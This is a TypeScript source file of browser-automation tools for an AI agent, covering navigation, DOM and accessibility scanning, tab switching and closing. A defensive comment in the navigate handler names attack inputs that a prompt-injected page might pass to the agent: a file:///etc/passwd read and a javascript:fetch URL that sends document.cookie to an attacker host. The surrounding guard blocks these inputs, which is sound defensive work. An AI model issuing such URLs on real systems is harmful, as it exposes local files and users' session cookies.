// Copyright © 2024-2026 XAGI Labs Private Limited. All rights reserved.
// This software is proprietary. Copying or reuse is prohibited.
// See LICENSE.md for details.

// ── Browser Navigation Tools ──────────────────
// Navigate, scan, back, switch tabs, close

import type { ToolDefinition } from "../get-current-time.js";
import { getCachedActions, markActionFailed, replayActions, shouldReplayActions } from "./action-cache.js";
import { withAgentUIHidden } from "./agent-cursor.js";
import { getActiveBackend, getCurrentMode } from "./browser-backend.js";
import { CAPTCHA_HINT, quickCaptchaCheck } from "./captcha.js";
import {
    ATLAS_HUD_JS,
    getAccessibilityTree,
    getActivePage,
    getActivePageIndex,
    getBrowser,
    getInteractiveElements,
    getLastElementMap,
    invalidateCache,
    resetBrowserContext,
    setActivePageIndex,
    setLastElementMap,
    waitForPageReady,
} from "./core.js";
import type { InteractiveElement } from "./types.js";

// Statuses that mean the site refused us (bot wall / rate limit / outage) — report as failure.
const BLOCKING_STATUSES = new Set([403, 429, 503]);

// ═══════════════════════════════════════════════
// TOOL: Navigate
// ═══════════════════════════════════════════════

export const browserNavigate: ToolDefinition = {
    schema: {
        type: "function",
        function: {
            name: "browser_navigate",
            description:
                "Navigate to a URL in the current tab. Returns page title, URL, and a condensed DOM of interactive elements. Use browser_switch_tab with new_tab=true to open a new tab first if needed.",
            parameters: {
                type: "object",
                properties: {
                    url: { type: "string", description: "URL to navigate to" },
                    new_tab: { type: "boolean", description: "Open URL in a new tab instead of the current one" },
                    wait_for: { type: "string", description: "CSS selector to wait for (optional)" },
                    timeout_ms: { type: "number", description: "Navigation timeout in milliseconds (default: 30000)" },
                },
                required: ["url"],
            },
        },
    },
    async handler(input) {
        try {
            // URL scheme guard — reject file://, javascript:, data:, and any
            // other non-HTTP(S) URI. A prompt-injected page or a misbehaving
            // agent could otherwise hand us file:///etc/passwd (local read)
            // or javascript:fetch(attacker+document.cookie) (XSS in the live
            // browser context). We accept only http:// and https://.
            const urlRaw = String(input.url ?? "").trim();
            if (!urlRaw) {
                return JSON.stringify({ error: "url is required" });
            }
            let scheme: string;
            try {
                scheme = new URL(urlRaw).protocol.toLowerCase();
            } catch {
                return JSON.stringify({ error: `invalid url: ${urlRaw.slice(0, 120)}` });
            }
            if (scheme !== "http:" && scheme !== "https:") {
                return JSON.stringify({
                    error: `unsafe URL scheme "${scheme}" — only http(s) is allowed`,
                    url: urlRaw.slice(0, 120),
                });
            }

            // Resolve the backend FIRST via getActivePage() (see core.ts getActivePage):
            // calling getBrowser() up front would launch Playwright even when the
            // Chrome extension backend is connected.
            let page = await getActivePage();
            const context = getCurrentMode() === "chrome" ? null : await getBrowser();
            if (input.new_tab) {
                if (context) {
                    page = await context.newPage();
                    // Track the new tab as active so subsequent tools operate on it
                    setActivePageIndex(context.pages().indexOf(page));
                } else {
                    await (await getActiveBackend()).newTab();
                    page = await getActivePage();
                }
            }
            const timeout = (input.timeout_ms as number) || 30000;
            // Show HUD while navigating
            const navDomain = urlRaw.replace(/^https?:\/\/(www\.)?/, "").split("/")[0];
            await page
                .evaluate(
                    `(${ATLAS_HUD_JS})(${JSON.stringify({ label: `🌐 Navigating to ${navDomain}`, done: false })})`,
                )
                .catch(() => {});
            // Navigation timeouts are non-fatal (page is likely usable even if not fully
            // loaded); any other goto error (DNS, connection refused, ...) is a failure.
            let navError: string | null = null;
            let status: number | null = null;
            try {
                // Playwright returns a Response; ChromePageProxy returns void (no status).
                const resp = (await page.goto(input.url as string, { waitUntil: "domcontentloaded", timeout })) as {
                    status?: () => number;
                } | null;
                status = resp?.status?.() ?? null;
            } catch (err) {
                if ((err as Error).name !== "TimeoutError") navError = (err as Error).message.split("\n")[0];
            }

            // Smart wait for the page to stabilize
            if (!navError) await waitForPageReady(page);
            // Clear HUD once page is ready
            await page.evaluate(`(${ATLAS_HUD_JS})(${JSON.stringify({ label: "", done: true })})`).catch(() => {});

            const captchaType = navError ? null : await quickCaptchaCheck(page);
            const captchaFields = captchaType
                ? { captcha_detected: true, captcha_type: captchaType, hint: CAPTCHA_HINT }
                : {};
            if (!navError && page.url().startsWith("chrome-error://"))
                navError = "browser error page (site unreachable)";
            if (!navError && status !== null && BLOCKING_STATUSES.has(status)) navError = `HTTP ${status}`;
            if (navError) {
                return JSON.stringify({
                    error: `Navigation failed: ${navError}`,
                    url: page.url(),
                    ...(status !== null ? { status } : {}),
                    ...captchaFields,
                });
            }

            if (input.wait_for) {
                await page.waitForSelector(input.wait_for as string, { timeout: 10000 }).catch(() => null);
            }

            const title = await page.title();
            const url = page.url();
            const tabCount = context ? context.pages().length : (await (await getActiveBackend()).getAllTabs()).length;

            // Run a11y tree + DOM scan in parallel
            const [accessibilityTree, elementMap] = await Promise.all([
                getAccessibilityTree(page),
                getInteractiveElements(page),
            ]);
            setLastElementMap(elementMap);

            const serializedElements = elementMap.map((e) => ({
                label: e.label,
                x: e.x,
                y: e.y,
                tag: e.tag,
                text: e.text,
                editorType: e.editorType,
                isOCRElement: e.isOCRElement,
            }));

            // Generate Condensed DOM Markdown
            let interactive_elements_text = "No interactive elements detected.";
            if (serializedElements.length > 0) {
                interactive_elements_text = serializedElements
                    .map((e) => {
                        if ((e as any).editorType)
                            return `[${e.label}] **CODE EDITOR** (${(e as any).editorType}) '${e.text}'`;
                        if ((e as any).isOCRElement) return `[${e.label}] [OCR] '${e.text}'`;
                        return `[${e.label}] ${e.tag} '${e.text}'`;
                    })
                    .join("\n");
            }

            // Design-tool detection (Figma, Canva, Miro, etc.)
            // These are canvas-based apps where accessibility tree is nearly empty.
            // Automatically set visual mode hint and coordinate-based click guidance.
            const DESIGN_TOOL_DOMAINS =
                /\b(figma\.com|canva\.com|miro\.com|lucid\.app|draw\.io|diagrams\.net|sketch\.com|framer\.com|webflow\.com|airtable\.com|retool\.com|linear\.app)\b/;
            const isDesignTool = DESIGN_TOOL_DOMAINS.test(url);
            const hasVeryFewElements = elementMap.length < 5;

            const result: Record<string, unknown> = {
                success: true,
                title,
                url,
                open_tabs: tabCount,
                interactive_elements_text,
                tip: "Read interactive_elements_text to find the label ID, then use browser_click_at with the label to click.",
                ...(status !== null ? { status } : {}),
                ...captchaFields,
            };

            // `canvas_app` means a GENUINE canvas surface (design tool) — it drives
            // the agent to vision-only coordinate clicking. A transient empty/low
            // DOM scan on an ordinary page (e.g. google.com scanned 0 elements before
            // it settled) must NOT be labelled canvas_app, or the agent abandons the
            // fast DOM path for a normal site. So: design tools → canvas_app; few/zero
            // elements on a non-design domain → only a "rescan visually" hint.
            if (isDesignTool) {
                result.design_tool_mode = true;
                result.canvas_app = true;
                result.tip = `🎨 DESIGN TOOL DETECTED (${navDomain}). This is a canvas app with minimal DOM. ALWAYS use browser_scan(visual:true) to see the UI, then click by exact coordinates (x,y) NOT by label. Use browser_scan(visual:true) before every action. Keyboard shortcuts are key: 'v'=select, 'r'=rectangle, 't'=text, 'h'=hand/pan, Escape=deselect, Cmd+Z=undo, Cmd+S=save.`;
            } else if (hasVeryFewElements) {
                result.design_tool_mode = false;
                result.canvas_app = false; // ordinary page with a thin/cold scan, not a canvas
                result.tip =
                    "⚠️ Few interactive elements detected — the page may still be loading or the scan ran early. Re-run browser_scan (optionally visual:true) before deciding it's element-less.";
            }

            if (accessibilityTree) {
                result.accessibility_tree = accessibilityTree;
            }

            // Check action cache — if we have a high-success cached sequence for this URL,
            // inform the agent so it can use browser_replay_actions instead of re-analyzing
            try {
                const cached = getCachedActions(url);
                if (cached && shouldReplayActions(cached)) {
                    result.cached_actions_available = true;
                    result.cached_action_count = cached.actions.length;
                    result.cached_success_rate = Math.round(
                        (cached.successCount / Math.max(1, cached.successCount + cached.failCount)) * 100,
                    );
                    result.tip =
                        "Cached actions available for this page! Use browser_replay_actions to replay them (skips LLM analysis). Falls back automatically if they fail.";
                }
            } catch {
                /* action cache lookup non-fatal */
            }

            return JSON.stringify(result);
        } catch (err) {
            return JSON.stringify({ error: `Navigation failed: ${(err as Error).message}` });
        }
    },
};

// ═══════════════════════════════════════════════
// TOOL: DOM Scanner (TEXT ONLY)
// ═══════════════════════════════════════════════

export const browserScan: ToolDefinition = {
    schema: {
        type: "function",
        function: {
            name: "browser_scan",
            description:
                "Scan the active browser page to get a textual DOM tree of all clickable/interactive elements. Returns an accessibility tree (compact semantic view) plus a labeled element list. Use the label numbers with browser_click_at's 'label' param for precise clicking. Set visual=true for design tools (Canva, Figma), maps, or any page where you need to SEE the layout visually. Use hover_at to pre-hover before scanning — essential for pages like YouTube where controls are hidden until hover.",
            parameters: {
                type: "object",
                properties: {
                    full_page: { type: "boolean", description: "Capture full page (default: false)" },
                    clean: {
                        type: "boolean",
                        description: "No element labels — just the raw page (for reading text/images)",
                    },
                    visual: {
                        type: "boolean",
                        description:
                            "Attach a screenshot so you can SEE the page. Use for design tools, maps, image-heavy pages, or when you need visual context to make decisions.",
                    },
                    hover_at: {
                        type: "object",
                        description:
                            "If provided, hover at these coordinates (with interpolated steps) BEFORE scanning. Use to reveal hover-hidden controls — e.g. {x: 640, y: 400} on a YouTube page reveals the player controls. Wait is applied before scan.",
                        properties: {
                            x: { type: "number" },
                            y: { type: "number" },
                            steps: { type: "number", description: "Mouse interpolation steps (default: 8)" },
                            wait_ms: {
                                type: "number",
                                description: "How long to dwell after hovering before scanning (default: 600ms)",
                            },
                        },
                    },
                },
                required: [],
            },
        },
    },
    async handler(input) {
        try {
            const page = await getActivePage();

            // Pre-hover: reveal hidden controls before scanning (e.g. YouTube player controls)
            if (input.hover_at) {
                const ha = input.hover_at as { x?: number; y?: number; steps?: number; wait_ms?: number };
                const hx = ha.x ?? 640,
                    hy = ha.y ?? 400;
                const hSteps = ha.steps ?? 8,
                    hWait = ha.wait_ms ?? 600;
                await page.mouse.move(hx, hy, { steps: hSteps });
                await page.waitForTimeout(hWait);
            }

            const title = await page.title();
            const url = page.url();

            let elementMap: InteractiveElement[] = [];

            // Run accessibility tree extraction in parallel with DOM scan
            // A11y tree is faster (80-90% smaller than DOM) and gives a semantic page view
            const a11yPromise = getAccessibilityTree(page);

            if (!input.clean) {
                // Force-refresh cache when hover_at was used (new elements may be visible now)
                elementMap = await getInteractiveElements(page, !!input.hover_at);
            }

            const accessibilityTree = await a11yPromise;

            setLastElementMap(elementMap);

            // Strip the handles out of the metadata sent to the LLM (they don't serialize)
            const serializedElements = elementMap.map((e) => ({
                label: e.label,
                x: e.x,
                y: e.y,
                tag: e.tag,
                text: e.text,
                editorType: e.editorType,
                isOCRElement: e.isOCRElement,
            }));

            // Generate Condensed DOM Markdown
            let interactive_elements_text = "No interactive elements detected.";
            if (serializedElements.length > 0) {
                interactive_elements_text = serializedElements
                    .map((e) => {
                        if ((e as any).editorType)
                            return `[${e.label}] **CODE EDITOR** (${(e as any).editorType}) '${e.text}'`;
                        if ((e as any).isOCRElement) return `[${e.label}] [OCR] '${e.text}'`;
                        return `[${e.label}] ${e.tag} '${e.text}'`;
                    })
                    .join("\n");
            }

            // Auto-detect design tools — force visual mode + coordinate-click guidance
            const DESIGN_DOMAINS =
                /\b(figma\.com|canva\.com|miro\.com|lucid\.app|draw\.io|diagrams\.net|sketch\.com|framer\.com|webflow\.com|retool\.com|linear\.app)\b/;
            const isDesignApp = DESIGN_DOMAINS.test(url);
            // Also auto-visual if very few elements found (canvas app, game, etc.)
            const forceVisual = isDesignApp || elementMap.length < 4;
            const doVisual = !!(input.visual || forceVisual);

            const result: Record<string, unknown> = {
                success: true,
                title,
                url,
                interactive_elements_text,
                viewport: { width: 1280, height: 800 },
                tip: "Use interactive_elements_text to find the label ID, then click it using browser_click_at.",
            };

            if (isDesignApp) {
                result.design_tool = true;
                result.tip = `🎨 DESIGN APP (${url.split("/")[2]}). Canvas-based — very few DOM elements. ALWAYS click by exact x,y coordinates from the screenshot, NOT by label. Common shortcuts: v=select, r=rectangle, t=text, h=pan, Escape=deselect. browser_scan(visual:true) before every action.`;
            }

            // Include accessibility tree if available (compact semantic page view)
            if (accessibilityTree) {
                result.accessibility_tree = accessibilityTree;
                if (!isDesignApp)
                    result.tip =
                        "Read accessibility_tree for a compact semantic view of the page. Use interactive_elements_text labels for clicking.";
            }

            // Visual mode: attach screenshot. Auto-enabled for design tools and sparse DOM pages.
            if (doVisual) {
                try {
                    const screenshotBuffer = await withAgentUIHidden(page, () =>
                        page.screenshot({
                            type: "jpeg",
                            quality: isDesignApp ? 75 : 55, // Higher quality for design tools (need to read UI)
                            fullPage: !!input.full_page,
                            scale: "css",
                        }),
                    );
                    result.screenshot_base64 = screenshotBuffer.toString("base64");
                    result.mime_type = "image/jpeg";
                    result.screenshot_size_kb = Math.round(screenshotBuffer.length / 1024);
                    if (isDesignApp) {
                        result.tip = `🎨 DESIGN APP screenshot attached. Click by exact pixel coordinates (x,y) you see in the screenshot. Use keyboard shortcuts for tools. browser_scan(visual:true) to refresh.`;
                    } else {
                        result.tip =
                            "Use the screenshot to understand the visual layout. Use interactive_elements_text labels for clicking.";
                    }
                } catch {
                    /* screenshot failed, text-only fallback */
                }
            }

            return JSON.stringify(result);
        } catch (err) {
            return JSON.stringify({ error: `DOM Scan failed: ${(err as Error).message}` });
        }
    },
};

// ═══════════════════════════════════════════════
// TOOL: Back
// ═══════════════════════════════════════════════

export const browserBack: ToolDefinition = {
    schema: {
        type: "function",
        function: {
            name: "browser_back",
            description: "Go back in browser history (like clicking the back button).",
            parameters: {
                type: "object",
                properties: {},
                required: [],
            },
        },
    },
    async handler() {
        try {
            const page = await getActivePage();
            await page.goBack({ waitUntil: "domcontentloaded" }).catch(() => null);
            await waitForPageReady(page);

            const title = await page.title();
            const url = page.url();

            const elementMap = await getInteractiveElements(page);
            setLastElementMap(elementMap);

            const serializedElements = elementMap.map((e) => ({
                label: e.label,
                x: e.x,
                y: e.y,
                tag: e.tag,
                text: e.text,
                editorType: e.editorType,
                isOCRElement: e.isOCRElement,
            }));

            let interactive_elements_text = "No interactive elements detected.";
            if (serializedElements.length > 0) {
                interactive_elements_text = serializedElements
                    .map((e) => {
                        if ((e as any).editorType)
                            return `[${e.label}] **CODE EDITOR** (${(e as any).editorType}) '${e.text}'`;
                        if ((e as any).isOCRElement) return `[${e.label}] [OCR] '${e.text}'`;
                        return `[${e.label}] ${e.tag} '${e.text}'`;
                    })
                    .join("\n");
            }

            return JSON.stringify({ success: true, title, url, interactive_elements_text });
        } catch (err) {
            return JSON.stringify({ error: `Back failed: ${(err as Error).message}` });
        }
    },
};

// ═══════════════════════════════════════════════
// TOOL: Switch Tab
// ═══════════════════════════════════════════════

async function switchTabInChrome(input: Record<string, unknown>): Promise<string> {
    const { getExtensionTabs, sendBridgeCommand } = await import("./chrome-bridge.js");
    const list = async () =>
        (await getExtensionTabs()).map((t, index) => ({ index, title: t.title, url: t.url, active: t.active, id: t.id }));
    const view = (tabs: Awaited<ReturnType<typeof list>>) => tabs.map(({ id: _id, ...t }) => t);
    let tabs = await list();
    const at = (i: unknown) => (typeof i === "number" ? tabs[i] : undefined);
    if (typeof input.close_tab_index === "number" || input.close_active) {
        const target = typeof input.close_tab_index === "number" ? at(input.close_tab_index) : tabs.find((t) => t.active);
        if (!target) return JSON.stringify({ error: "No such tab.", tabs: view(tabs) });
        await sendBridgeCommand("close_tab", { tabId: target.id });
        tabs = await list();
        return JSON.stringify({ success: true, action: "closed", closed: { title: target.title, url: target.url }, tabs: view(tabs) });
    }
    if (input.new_tab) {
        await sendBridgeCommand("navigate", { url: (input.url as string) || "about:blank", newTab: true });
        tabs = await list();
        return JSON.stringify({ success: true, action: "new_tab_opened", tabs: view(tabs) });
    }
    if (typeof input.tab_index === "number") {
        const target = at(input.tab_index);
        if (!target) return JSON.stringify({ error: "No such tab.", tabs: view(tabs) });
        await sendBridgeCommand("switch_tab", { tabId: target.id });
        return JSON.stringify({ success: true, action: "switched", title: target.title, url: target.url, active_tab: input.tab_index });
    }
    return JSON.stringify({ success: true, tabs: view(tabs), open_tabs: tabs.length });
}

export const browserSwitchTab: ToolDefinition = {
    schema: {
        type: "function",
        function: {
            name: "browser_switch_tab",
            description:
                "Switch to a different browser tab by index (0-based), open a new tab (with optional URL), or close the active tab. Use this to manage multiple tabs.",
            parameters: {
                type: "object",
                properties: {
                    tab_index: { type: "number", description: "Switch to tab at this index (0-based)" },
                    new_tab: {
                        type: "boolean",
                        description: "Open a new empty tab (then use browser_navigate to go somewhere)",
                    },
                    url: {
                        type: "string",
                        description: "If new_tab=true, optionally navigate to this URL immediately",
                    },
                    close_active: { type: "boolean", description: "Close the currently active tab" },
                    close_tab_index: { type: "number", description: "Close the tab at this index (0-based, from the list)" },
                },
                required: [],
            },
        },
    },
    async handler(input) {
        try {
            // The user's real Chrome (extension bridge): its tabs, not the headless
            // browser's — that path listed zero tabs and could close nothing.
            await getActiveBackend(); // resolve the mode first: in a fresh session it isn't set yet
            if (getCurrentMode() === "chrome") return await switchTabInChrome(input);
            const context = await getBrowser();
            const pages = context.pages();

            // Close active tab
            if (input.close_active) {
                if (pages.length === 1) {
                    return JSON.stringify({ error: "Cannot close the last remaining tab." });
                }
                const page = await getActivePage();
                await page.close();
                const newPages = context.pages();
                const newIdx = Math.min(getActivePageIndex(), newPages.length - 1);
                setActivePageIndex(newIdx);
                await newPages[newIdx].bringToFront();
                return JSON.stringify({
                    success: true,
                    action: "closed_active",
                    active_tab: newIdx,
                    open_tabs: newPages.length,
                });
            }

            // Open new tab
            if (input.new_tab) {
                const newPage = await context.newPage();
                if (input.url) {
                    await newPage
                        .goto(input.url as string, { waitUntil: "domcontentloaded", timeout: 30000 })
                        .catch(() => null);
                    await waitForPageReady(newPage);
                }
                const newPages = context.pages();
                const newTabIdx = newPages.indexOf(newPage);
                setActivePageIndex(newTabIdx);
                await newPage.bringToFront();

                // Invalidate cache when switching pages
                invalidateCache();

                const title = await newPage.title();
                const url = newPage.url();

                // Scan elements in the new tab
                const elementMap = await getInteractiveElements(newPage);
                setLastElementMap(elementMap);

                const serializedElements = elementMap.map((e) => ({
                    label: e.label,
                    x: e.x,
                    y: e.y,
                    tag: e.tag,
                    text: e.text,
                    editorType: e.editorType,
                    isOCRElement: e.isOCRElement,
                }));

                let interactive_elements_text = "No interactive elements detected.";
                if (serializedElements.length > 0) {
                    interactive_elements_text = serializedElements
                        .map((e) => {
                            if ((e as any).editorType)
                                return `[${e.label}] **CODE EDITOR** (${(e as any).editorType}) '${e.text}'`;
                            if ((e as any).isOCRElement) return `[${e.label}] [OCR] '${e.text}'`;
                            return `[${e.label}] ${e.tag} '${e.text}'`;
                        })
                        .join("\n");
                }

                return JSON.stringify({
                    success: true,
                    action: "new_tab_opened",
                    title,
                    url,
                    active_tab: newTabIdx,
                    open_tabs: newPages.length,
                    interactive_elements_text,
                });
            }

            // Switch to existing tab by index
            if (input.tab_index !== undefined) {
                const idx = input.tab_index as number;
                if (idx < 0 || idx >= pages.length) {
                    return JSON.stringify({
                        error: `Tab index ${idx} out of range. Available tabs: 0 to ${pages.length - 1}`,
                    });
                }
                setActivePageIndex(idx);
                await pages[idx].bringToFront();

                // Invalidate cache when switching pages
                invalidateCache();

                const title = await pages[idx].title();
                const url = pages[idx].url();

                // Scan elements in the switched-to tab
                const elementMap = await getInteractiveElements(pages[idx]);
                setLastElementMap(elementMap);

                const serializedElements = elementMap.map((e) => ({
                    label: e.label,
                    x: e.x,
                    y: e.y,
                    tag: e.tag,
                    text: e.text,
                    editorType: e.editorType,
                    isOCRElement: e.isOCRElement,
                }));

                let interactive_elements_text = "No interactive elements detected.";
                if (serializedElements.length > 0) {
                    interactive_elements_text = serializedElements
                        .map((e) => {
                            if ((e as any).editorType)
                                return `[${e.label}] **CODE EDITOR** (${(e as any).editorType}) '${e.text}'`;
                            if ((e as any).isOCRElement) return `[${e.label}] [OCR] '${e.text}'`;
                            return `[${e.label}] ${e.tag} '${e.text}'`;
                        })
                        .join("\n");
                }

                return JSON.stringify({
                    success: true,
                    action: "switched_tab",
                    title,
                    url,
                    active_tab: idx,
                    open_tabs: pages.length,
                    interactive_elements_text,
                });
            }

            // No action specified — list tabs
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            const tabList = await Promise.all(
                pages.map(async (p: any, i: number) => ({
                    index: i,
                    title: await p.title(),
                    url: p.url(),
                    active: i === getActivePageIndex(),
                })),
            );

            return JSON.stringify({ tabs: tabList, active_tab: getActivePageIndex(), open_tabs: pages.length });
        } catch (err) {
            return JSON.stringify({ error: `Tab switch failed: ${(err as Error).message}` });
        }
    },
};

// ═══════════════════════════════════════════════
// TOOL: Close Browser
// ═══════════════════════════════════════════════

export const browserClose: ToolDefinition = {
    schema: {
        type: "function",
        function: {
            name: "browser_close",
            description: "Close the browser completely (all tabs). The browser will restart on next use.",
            parameters: {
                type: "object",
                properties: {},
                required: [],
            },
        },
    },
    async handler() {
        try {
            const context = await getBrowser();
            await context.close();
            resetBrowserContext(); // null out the module-level ref so getBrowser() creates a fresh context
            return JSON.stringify({ success: true, message: "Browser closed. Will restart on next navigation." });
        } catch (err) {
            return JSON.stringify({ error: `Close failed: ${(err as Error).message}` });
        }
    },
};
